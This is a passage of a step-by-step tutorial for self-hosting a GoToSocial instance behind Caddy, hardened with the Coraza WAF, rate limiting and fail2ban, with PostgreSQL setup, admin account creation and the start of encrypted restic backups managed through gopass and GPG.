&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create the default hierarchy:&lt;/span&gt;
&lt;span class="nb"&gt;sudo mkdir&lt;/span&gt; &lt;span class="nt"&gt;-p&lt;/span&gt; /var/lib/gotosocial/storage/certs
&lt;span class="nb"&gt;sudo mkdir&lt;/span&gt; &lt;span class="nt"&gt;-p&lt;/span&gt; /var/lib/gotosocial/.config
&lt;span class="nb"&gt;sudo mkdir&lt;/span&gt; &lt;span class="nt"&gt;-p&lt;/span&gt; /var/lib/gotosocial/.cache

&lt;span class="c"&gt;# Download GoToSocial.&lt;/span&gt;
&lt;span class="c"&gt;# Get the latest version here and change it accordingly below: https://github.com/superseriousbusiness/gotosocial/releases&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; /var/lib/gotosocial
&lt;span class="nb"&gt;sudo &lt;/span&gt;wget https://github.com/superseriousbusiness/gotosocial/releases/download/v0.17.3/gotosocial_0.17.3_linux_amd64.tar.gz

&lt;span class="c"&gt;# Grab the checksum file too:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;wget https://github.com/superseriousbusiness/gotosocial/releases/download/v0.17.3/checksums.txt

&lt;span class="c"&gt;# Check if checksum matches the one corresponding to your version:&lt;/span&gt;
&lt;span class="nb"&gt;cat &lt;/span&gt;checksums.txt
&lt;span class="nb"&gt;sha256sum &lt;/span&gt;gotosocial_0.17.3_linux_amd64.tar.gz

&lt;span class="c"&gt;# All good? Then let's extract the archive:&lt;/span&gt;
&lt;span class="nb"&gt;sudo tar&lt;/span&gt; &lt;span class="nt"&gt;-xzf&lt;/span&gt; gotosocial_0.17.3_linux_amd64.tar.gz

&lt;span class="c"&gt;# Move the config example file in the /.config directory and&lt;/span&gt;
&lt;span class="c"&gt;# change permissions accordingly:&lt;/span&gt;
&lt;span class="nb"&gt;sudo mv&lt;/span&gt; /var/lib/gotosocial/example/config.yaml /var/lib/gotosocial/.config/
&lt;span class="nb"&gt;sudo chmod &lt;/span&gt;o-rwx /var/lib/gotosocial/.config/config.yaml

&lt;span class="c"&gt;# Move the systemd unit file example to /etc/systemd/system/:&lt;/span&gt;
&lt;span class="nb"&gt;sudo mv&lt;/span&gt; /var/lib/gotosocial/example/gotosocial.service /etc/systemd/system/

&lt;span class="c"&gt;# Move the binary to $PATH and change permissions accordingly:&lt;/span&gt;
&lt;span class="nb"&gt;sudo chmod &lt;/span&gt;&lt;span class="nv"&gt;u&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;x,g&lt;span class="o"&gt;=&lt;/span&gt;x,o-rwx /var/lib/gotosocial/gotosocial
&lt;span class="nb"&gt;sudo chown &lt;/span&gt;gotosocial:gotosocial /var/lib/gotosocial/gotosocial
&lt;span class="nb"&gt;sudo mv&lt;/span&gt; /var/lib/gotosocial/gotosocial /usr/bin/

&lt;span class="c"&gt;# Do a bit of cleanup in /var/lib/gotosocial:&lt;/span&gt;
&lt;span class="nb"&gt;sudo rm&lt;/span&gt; &lt;span class="nt"&gt;-rf&lt;/span&gt; /var/lib/gotosocial/checksums.txt /var/lib/gotosocial/example/ /var/lib/gotosocial/gotosocial_0.17.3_linux_amd64.tar.gz

&lt;span class="c"&gt;# Finally, set permissions for user and group gotosocial, so only&lt;/span&gt;
&lt;span class="c"&gt;# them can own /var/lib/gotosocial:&lt;/span&gt;
&lt;span class="nb"&gt;sudo chown&lt;/span&gt; &lt;span class="nt"&gt;-R&lt;/span&gt; gotosocial:gotosocial /var/lib/gotosocial
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now, let&amp;#39;s configure your instance settings and the systemd unit file. Change, and uncomment if necessary, the following settings in &lt;code&gt;/etc/systemd/system/gotosocial.service&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="nt"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;"GTS_WAZERO_COMPILATION_CACHE=/var/lib/gotosocial/.cache"
&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;/usr/bin/gotosocial --config-path /var/lib/gotosocial/.config/config.yaml server start
&lt;span class="nt"&gt;WorkingDirectory&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;/var/lib/gotosocial
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Change, and uncomment if necessary, the following settings in &lt;code&gt;/var/lib/gotosocial/.config/config.yaml&lt;/code&gt;. Replace &lt;code&gt;example.net&lt;/code&gt; with your own domain name:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;host&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;gts.example.net&lt;/span&gt;
&lt;span class="na"&gt;account-domain&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;example.net&lt;/span&gt;
&lt;span class="na"&gt;letsencrypt-enabled&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
&lt;span class="na"&gt;bind-address&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;localhost"&lt;/span&gt;
&lt;span class="na"&gt;web-template-base-dir&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;/var/lib/gotosocial/web/template/"&lt;/span&gt;
&lt;span class="na"&gt;web-asset-base-dir&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;/var/lib/gotosocial/web/assets/"&lt;/span&gt;
&lt;span class="na"&gt;storage-local-base-path&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;/var/lib/gotosocial/storage"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We&amp;#39;ll come back later to this config file for a few more settings.&lt;/p&gt;

&lt;h2&gt;Getting coreruleset and coraza config&lt;/h2&gt;

&lt;p&gt;For coraza-caddy to work properly as a WAF, you must download its rules and config and include them later on. There is a newer way to load them, as described in the &lt;a href="https://github.com/corazawaf/coraza-caddy?tab=readme-ov-file#using-owasp-core-ruleset" rel="nofollow"&gt;README&lt;/a&gt;, but it simply didn&amp;#39;t work in my case. The &amp;quot;old&amp;quot; method is also more modular if we ever need to create / update / delete some rules, as they&amp;#39;re just editable config files. Let&amp;#39;s opt for that method.&lt;/p&gt;

&lt;p&gt;To download the rules, let&amp;#39;s do the following:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create directory and clone coreruleset, as well&lt;/span&gt;
&lt;span class="c"&gt;# as corazawaf for its config:&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; /etc/caddy
&lt;span class="nb"&gt;sudo mkdir &lt;/span&gt;waf &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;waf
&lt;span class="nb"&gt;sudo &lt;/span&gt;git clone https://github.com/coreruleset/coreruleset.git
&lt;span class="nb"&gt;sudo &lt;/span&gt;git clone https://github.com/corazawaf/coraza.git

&lt;span class="c"&gt;# Set owner and group of /etc/caddy to caddy:&lt;/span&gt;
&lt;span class="nb"&gt;sudo chown&lt;/span&gt; &lt;span class="nt"&gt;-R&lt;/span&gt; caddy:caddy /etc/caddy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You also need to edit coreruleset&amp;#39;s setup to accept more HTTP methods. In &lt;code&gt;/etc/caddy/waf/coreruleset/crs-setup.conf.example&lt;/code&gt;, uncomment the following rules:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;#SecAction \
#    "id:900200,\
#    phase:1,\
#    pass,\
#    t:none,\
#    nolog,\
#    tag:'OWASP_CRS',\
#    ver:'OWASP_CRS/4.10.0-dev',\
#    setvar:'tx.allowed_methods=GET HEAD POST OPTIONS'"
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And add PUT, PATCH and DELETE methods, like the following:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;SecAction \
    "id:900200,\
    phase:1,\
    pass,\
    t:none,\
    nolog,\
    tag:'OWASP_CRS',\
    ver:'OWASP_CRS/4.10.0-dev',\
    setvar:'tx.allowed_methods=GET HEAD POST OPTIONS PUT PATCH DELETE'"
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Putting it all together&lt;/h2&gt;

&lt;p&gt;You&amp;#39;re now ready to reverse proxy GoToSocial with Caddy. The following &lt;code&gt;Caddyfile&lt;/code&gt; should replace the quick test made in &lt;code&gt;/etc/caddy/Caddyfile&lt;/code&gt; earlier. GoToSocial has rate limiting by default, but we&amp;#39;ll harden it at the &lt;code&gt;/auth/sign_in&lt;/code&gt; endpoint for good measure. Other settings are also commented. Don&amp;#39;t forget to replace &lt;code&gt;your-email@example.net&lt;/code&gt; with, well, your email address, as well as &lt;code&gt;example.net&lt;/code&gt; with your domain name. It&amp;#39;s not necessary for your email address to be from the same domain as your instance.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Take your time and make sure you replace &lt;code&gt;example.net&lt;/code&gt; everywhere! Your configuration has to be right before federating with people. Your domain can&amp;#39;t be changed afterwards unless every other admin messes with their own database to resolve it.&lt;/strong&gt;&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# Specify the email that will be used for the TLS certificates, and
# set up proper order settings.
{
        email your-email@example.net
        order coraza_waf first
        order rate_limit before basic_auth
}

# Common snippet for various base settings.
(common) {
        # Remove 'Server:' response header to avoid exposing Caddy usage.
        header /* {
                -Server
        }

        # Log requests in common log format, each host with their own file.
        # This will permit easier parsing with fail2ban.
        log {
                format transform "{common_log}"
                output file /var/log/{args[0]}.access.log {
                        roll_keep_for 30d
                }
        }

        # Compress traffic with proper protocols.
        encode zstd gzip
}

# Coraza WAF rules.
(waf) {
        coraza_waf {
                directives `
                Include /etc/caddy/waf/coraza/coraza.conf-recommended
                Include /etc/caddy/waf/coreruleset/crs-setup.conf.example
                Include /etc/caddy/waf/coreruleset/rules/*.conf
                SecRuleEngine On
                `
        }
}

example.net {
        import common example.net
        import waf

        # Required redirections for split-domain deployment.
        redir /.well-known/host-meta* https://gts.example.net{uri} permanent
        redir /.well-known/webfinger* https://gts.example.net{uri} permanent
        redir /.well-known/nodeinfo* https://gts.example.net{uri} permanent
}

gts.example.net {
        import common gts.example.net
        import waf

        # Add rate limiting for admin endpoint, with key {remote_host}.
        # This is a pretty strong rate limit, as bruteforcing the
        # admin's password would mean game over: there is no 2FA for
        # logging into the admin's dashboard at the moment. Yes, if
        # you enter the wrong password, you'll have to grab a coffee
        # for the next 30 minutes and bear with it. If that's
        # overkill, you can change the window directive accordingly.
        rate_limit {
                zone auth {
                        match {
                                path /auth/sign_in
                                method POST
                        }
                        key {remote_host} # For this IP...
                        events 2 # ... Allow only 2 requests...
                        window 30m # ... In a period of 30 minutes.
                }
        }

        # Reverse proxying the rest of our GoToSocial instance normally.
        reverse_proxy http://localhost:8080 {
                # Flush immediately and prevent buffered response to the client.
                flush_interval -1
        }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Create the log files that caddy will use in /var/log, as specified in your Caddyfile. Replace &lt;code&gt;example.net&lt;/code&gt; accordingly:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo touch&lt;/span&gt; /var/log/gts.example.net.access.log
&lt;span class="nb"&gt;sudo touch&lt;/span&gt; /var/log/example.net.access.log
&lt;span class="nb"&gt;sudo chown &lt;/span&gt;caddy:caddy /var/log/gts.example.net.access.log
&lt;span class="nb"&gt;sudo chown &lt;/span&gt;caddy:caddy /var/log/example.net.access.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Run &lt;code&gt;sudo -u caddy caddy validate --config /etc/caddy/Caddyfile&lt;/code&gt; to check that your Caddyfile has no errors, and &lt;code&gt;sudo -u caddy caddy fmt --overwrite /etc/caddy/Caddyfile&lt;/code&gt; to properly format it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: if caddy&amp;#39;s validation returns an error similar to &lt;code&gt;invalid WAF config from string: failed to parse string: &amp;lt;...&amp;gt;&lt;/code&gt;, this is likely because some default WAF rules cannot be used with our server. I&amp;#39;m honestly at a bit of a loss as to how to fix this for the moment. You can keep proceeding anyway, as long as no other errors are found.&lt;/p&gt;

&lt;p&gt;Next, let&amp;#39;s create the default PostgreSQL database for your GoToSocial instance:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Switch to postgres system account:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-i&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; postgres

&lt;span class="c"&gt;# Access postgreSQL prompt:&lt;/span&gt;
psql

&lt;span class="c"&gt;# Create GoToSocial database, replacing the placeholder&lt;/span&gt;
&lt;span class="c"&gt;# surrounded by brackets with a *strong*, *unique* password:&lt;/span&gt;
create database gotosocial with locale &lt;span class="s1"&gt;'C.UTF-8'&lt;/span&gt; template template0&lt;span class="p"&gt;;&lt;/span&gt;
create user gotosocial with password &lt;span class="s1"&gt;'&amp;lt;some really good password&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
grant all privileges on database gotosocial to gotosocial&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c"&gt;# Switch to gotosocial user:&lt;/span&gt;
&lt;span class="se"&gt;\c&lt;/span&gt; gotosocial postgres

&lt;span class="c"&gt;# Grant access to schema public for gotosocial user:&lt;/span&gt;
grant all on schema public to gotosocial&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c"&gt;# Check if the database has been created:&lt;/span&gt;
&lt;span class="se"&gt;\l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You&amp;#39;ll also need to add PostgreSQL settings in &lt;code&gt;/var/lib/gotosocial/.config/config.yaml&lt;/code&gt;, specifying the strong password you created earlier. Make sure to keep it safely outside of your VPS, such as in a password manager:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;db-type&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;postgres"&lt;/span&gt;
&lt;span class="na"&gt;db-address&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;127.0.0.1"&lt;/span&gt;
&lt;span class="na"&gt;db-port&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;5432&lt;/span&gt;
&lt;span class="na"&gt;db-user&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;gotosocial"&lt;/span&gt;
&lt;span class="na"&gt;db-password&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;some&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;really&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;good&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;password&amp;gt;"&lt;/span&gt;
&lt;span class="na"&gt;db-database&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;gotosocial"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Additional hardening with fail2ban&lt;/h2&gt;

&lt;p&gt;You can use fail2ban to temporarily ban IPs getting you a lot of client request errors, as this could indicate some malicious behavior against your instance. Create the following filter rule with &lt;code&gt;sudo vi /etc/fail2ban/filter.d/gotosocial-4xx.conf&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight toml"&gt;&lt;code&gt;&lt;span class="nn"&gt;[Definition]&lt;/span&gt;
&lt;span class="py"&gt;failregex&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;^&amp;lt;HOST&amp;gt;.*&lt;/span&gt;&lt;span class="s"&gt;"(GET|POST|OPTION).*"&lt;/span&gt; &lt;span class="err"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0-9&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0-9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;)&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="err"&gt;\d&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;*$&lt;/span&gt;
&lt;span class="py"&gt;ignoreregex&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, add the following entry at the bottom of &lt;code&gt;/etc/fail2ban/jail.local&lt;/code&gt;, replacing &lt;code&gt;gts.example.net&lt;/code&gt; with your domain name:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight toml"&gt;&lt;code&gt;&lt;span class="nn"&gt;[gotosocial-4xx]&lt;/span&gt;
&lt;span class="py"&gt;enabled&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="py"&gt;logpath&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;/var/log/gts.example.net.access.log&lt;/span&gt;
&lt;span class="py"&gt;port&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;http&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;https&lt;/span&gt;
&lt;span class="py"&gt;maxretry&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="py"&gt;findtime&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;m&lt;/span&gt;
&lt;span class="py"&gt;bantime&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="err"&gt;m&lt;/span&gt;
&lt;span class="py"&gt;banaction&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;ufw&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Restart fail2ban with &lt;code&gt;sudo systemctl restart fail2ban&lt;/code&gt; to apply changes.&lt;/p&gt;

&lt;h2&gt;All set for launch&lt;/h2&gt;

&lt;p&gt;All should be ready to run your instance. Hold your breath and start all services:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Enable and start all services:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl &lt;span class="nb"&gt;enable &lt;/span&gt;postgresql fail2ban caddy gotosocial
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl start postgresql fail2ban caddy gotosocial

&lt;span class="c"&gt;# Check that all previous services are loaded and running:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl status postgresql fail2ban caddy gotosocial
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Browse your domain such as &lt;a href="https://gts.example.net" rel="nofollow"&gt;https://gts.example.net&lt;/a&gt;. If you see the default page, congratulations! You can now check your configuration then setup your admin access.&lt;/p&gt;

&lt;h2&gt;Hardening checklist&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Check that Coraza WAF is working by accessing &lt;code&gt;https://gts.example.net/&amp;lt;script&amp;gt;&lt;/code&gt;: does this return a 403 error rather than 404?&lt;/li&gt;
&lt;li&gt;Check that rate limiting is working on &lt;code&gt;https://gts.example.net/auth/sign_in&lt;/code&gt; by entering nonexistent credentials twice (no account have been created yet anyway). Do subsequent attempts return 429 for the duration we expect?&lt;/li&gt;
&lt;li&gt;Check that your fail2ban config works by accessing an invalid page, such as running &lt;code&gt;curl https://gts.example.net/notavalidpage&lt;/code&gt; several times. Does this return &lt;code&gt;Couldn&amp;#39;t connect to server&lt;/code&gt; after 5 attempts within a minute? Run &lt;code&gt;sudo ufw status verbose&lt;/code&gt; to make sure your IP gets (temporarily) rejected by fail2ban, and &lt;em&gt;not&lt;/em&gt; by GoToSocial&amp;#39;s default rate limiting.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Admin setup&lt;/h2&gt;

&lt;p&gt;Let&amp;#39;s create an admin user first:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create a regular account:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; gotosocial gotosocial &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--config-path&lt;/span&gt; /var/lib/gotosocial/.config/config.yaml &lt;span class="se"&gt;\&lt;/span&gt;
    admin account create &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--username&lt;/span&gt; &amp;lt;username&amp;gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--email&lt;/span&gt; &amp;lt;email@example.net&amp;gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--password&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;some very strong password&amp;gt;'&lt;/span&gt;

&lt;span class="c"&gt;# Validate the account without email confirmation:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; gotosocial gotosocial &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--config-path&lt;/span&gt; /var/lib/gotosocial/.config/config.yaml &lt;span class="se"&gt;\&lt;/span&gt;
    admin account confirm &lt;span class="nt"&gt;--username&lt;/span&gt; &amp;lt;username&amp;gt;

&lt;span class="c"&gt;# Promote the account to admin:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; gotosocial gotosocial &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--config-path&lt;/span&gt; /var/lib/gotosocial/.config/config.yaml &lt;span class="se"&gt;\&lt;/span&gt;
    admin account promote &lt;span class="nt"&gt;--username&lt;/span&gt; &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Log in with the admin account on &lt;code&gt;https://gts.example.net/settings&lt;/code&gt;. Admin settings should now be accessible for this account.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: the first command you ran in this section could leak your account&amp;#39;s password in &lt;code&gt;~/.bash_history&lt;/code&gt;: log out and log back in with SSH, open the file and remove the related lines if that&amp;#39;s the case. Better safe than sorry.&lt;/p&gt;

&lt;h2&gt;Backing up your instance&lt;/h2&gt;

&lt;p&gt;Your instance will only be as reliable as your backups. Anything can fail at any moment and you should always be prepared for that.&lt;/p&gt;

&lt;p&gt;Several methods for backups are listed in &lt;a href="https://docs.gotosocial.org/en/latest/admin/backup_and_restore/" rel="nofollow"&gt;GoToSocial&amp;#39;s documentation&lt;/a&gt;, with various advantages or disadvantages. Naturally, performing an entire backup directly from your VPS provider&amp;#39;s interface is the easiest method, but that would require possibly more downtime to proceed and can easily become expensive.&lt;/p&gt;

&lt;p&gt;I like to do the following backups:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Exports from GoToSocial CLI tool: it won&amp;#39;t save statuses, media, faves, bookmarks, pins, applications and tokens, but it&amp;#39;s very lightweight, so not much of an additional cost to keep them.&lt;/li&gt;
&lt;li&gt;PostgreSQL dump, saving the entire database.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/lib/gotosocial&lt;/code&gt;, mostly for GoToSocial&amp;#39;s config, media files and emojis.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/caddy&lt;/code&gt;, for Caddyfile and Coraza WAF.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/fail2ban/jail.local&lt;/code&gt; and &lt;code&gt;/etc/fail2ban/filter.d/gotosocial-4xx.conf&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/systemd/system/caddy.service&lt;/code&gt; and &lt;code&gt;/etc/systemd/system/gotosocial.service&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This means that if you were to lose &lt;em&gt;everything&lt;/em&gt;, the only thing you would have to set up again is your VPS initial configuration: users, groups, firewall, sshd setup, caddy, gotosocial and PostgreSQL installation. Everything else will be restored.&lt;/p&gt;

&lt;p&gt;We will use restic for this, which has &lt;a href="https://words.filippo.io/restic-cryptography/" rel="nofollow"&gt;encryption has a first-class feature&lt;/a&gt; and now supports compression. We will also use &lt;a href="https://github.com/gopasspw/gopass" rel="nofollow"&gt;gopass&lt;/a&gt; to manage the passphrases of your encrypted backups. You&amp;#39;ve already installed everything you need earlier on, so let&amp;#39;s get right to it.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s create a GPG key to manage the &lt;code&gt;gopass&lt;/code&gt; password store. I&amp;#39;m aware GPG sucks, but our use is fairly limited here: encrypting and decrypting passwords, so we can call a &lt;code&gt;gopass&lt;/code&gt; command rather than storing our restic passwords in plaintext. I would gladly use age instead, but it doesn&amp;#39;t have an agent and we&amp;#39;re looking to automate this.&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create a keypair with gpg:&lt;/span&gt;
gpg &lt;span class="nt"&gt;--expert&lt;/span&gt; &lt;span class="nt"&gt;--pinentry-mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;loopback &lt;span class="nt"&gt;--full-gen-key&lt;/span&gt;

&lt;span class="c"&gt;# * Choose "(9) ECC and ECC".&lt;/span&gt;
&lt;span class="c"&gt;# * Choose "(1) Curve 25519".&lt;/span&gt;
&lt;span class="c"&gt;# * Choose any expiration you desire for the key.&lt;/span&gt;
&lt;span class="c"&gt;# * Enter required information, such as your email address.&lt;/span&gt;
&lt;span class="c"&gt;# * Choose a strong and unique passphrase, and don't lose it!&lt;/span&gt;

&lt;span class="c"&gt;# Export your public and private keys:&lt;/span&gt;
gpg &lt;span class="nt"&gt;--armor&lt;/span&gt; &lt;span class="nt"&gt;--export&lt;/span&gt; &amp;lt;username&amp;gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; pubkey.asc
gpg &lt;span class="nt"&gt;--armor&lt;/span&gt; &lt;span class="nt"&gt;--export-secret-keys&lt;/span&gt; &amp;lt;username&amp;gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; privkey.asc

&lt;span class="c"&gt;# Keep them somewhere safe outside of your VPS, and *don't* lose them.&lt;/span&gt;
&lt;span class="c"&gt;# Once copied, remove pubkey.asc and privkey.asc.&lt;/span&gt;

&lt;span class="c"&gt;# Also add the following line at the end of ~/.bashrc:&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;GPG_TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;tty&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To make sure &lt;code&gt;gpg-agent&lt;/code&gt; keeps your passphrase cached, create the following &lt;code&gt;~/.gnupg/gpg-agent.conf&lt;/code&gt; file:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;default-cache-ttl 34560000
max-cache-ttl 34560000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Kill gpg-agent (and let it restart automatically) with &lt;code&gt;gpgconf --kill gpg-agent&lt;/code&gt;. This configuration will ensure that after your passphrase is entered once, it will stay cached for more than a year. You&amp;#39;ll need this, as your fully automated backups won&amp;#39;t run for long with the default cache ttl.&lt;/p&gt;

